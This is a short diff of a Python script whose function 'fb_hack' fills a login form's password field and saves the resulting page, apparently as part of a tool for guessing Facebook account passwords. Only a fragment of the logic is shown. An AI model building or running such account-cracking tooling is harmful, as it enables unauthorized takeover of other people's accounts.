@@ -75,13 +75,12 @@ def fb_hack(email, codex):
   soup = BeautifulSoup(response1, 'html.parser')
   with open("output1.html", "w") as file:
     file.write(str(soup))
+  with open("output1.txt", "w") as file:
+    file.write(str(soup))
   response1 = browser.response()
   soup = BeautifulSoup(response1, 'html.parser')
   browser.select_form(nr=0)
   browser.form['pass'] = str(1)
-  form = browser.global_form()
-  print(form)
-  print(browser.geturl())
 os.system('clear')
 passcode6()
 
